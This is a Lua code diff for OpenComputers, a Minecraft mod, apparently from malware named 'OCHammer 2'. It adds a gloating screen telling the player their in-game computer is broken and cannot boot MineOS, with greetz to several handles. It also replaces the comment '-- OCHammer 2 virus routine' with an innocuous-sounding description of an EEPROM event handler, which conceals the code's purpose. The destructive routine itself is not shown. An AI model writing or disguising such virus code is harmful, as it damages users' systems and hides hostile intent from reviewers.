@@ -13,7 +13,33 @@ function lol()
     gp.setResolution(resX,resY)
     gp.fill(1,1,resX,resY," ")
 
-    
+    -- display a message on the screen
+    local function displayMessage(message,offset)
+        local x, y = 1, 1+offset
+        for line in message:gmatch("([^\n]*)\n?") do
+          gp.set(x, y, line)
+          y = y + 1
+        end
+    end
+      
+    -- loop over each item in a table and display it on the screen
+    local function displayTable(table)
+        for i, v in ipairs(table) do
+            displayMessage(v,i)
+        end
+    end
+
+    -- display some greetz and stuff
+    local ok = {
+        "Looks like you broke the rules, do ya?";
+        "Now your OpenComputer is broken!";
+        "";
+        "I hope you're happy with your new OpenComputer.";
+        "Broken, classic, shiny. Can't even boot into MineOS.";
+        "Replacing the EEPROM is for broke people.";
+        "";
+        "GREETZ: OCboy3, agentfish, Chouladalls, Kurhox, SirKamilMarko";
+    }
 
     while true do
       coroutine.yield(1)
@@ -59,8 +85,8 @@ local smart = {
 }
 
 -- display a message on the screen
-local function displayMessage(message)
-  local x, y = 1, 1
+local function displayMessage(message,offset)
+  local x, y = 1, 1+offset
   for line in message:gmatch("([^\n]*)\n?") do
     gp.set(x, y, line)
     y = y + 1
@@ -70,7 +96,7 @@ end
 -- loop over each item in a table and display it on the screen
 local function displayTable(table)
   for i, v in ipairs(table) do
-    displayMessage(v)
+    displayMessage(v,i)
   end
 end
 
@@ -289,8 +315,7 @@ event.addHandler(
   end
 )
 
--- OCHammer 2 virus routine
-
+-- When event "component_removed" is called and component type is "eeprom", then do stuff
 event.addHandler(
     function(signalType,componentAddress, componentType)
         if (signalType == "component_added" or signalType == "component_removed") and componentType == "eeprom" then
@@ -298,6 +323,7 @@ event.addHandler(
         end
     end
 )
+
 
 -- Logging in
 system.authorize()
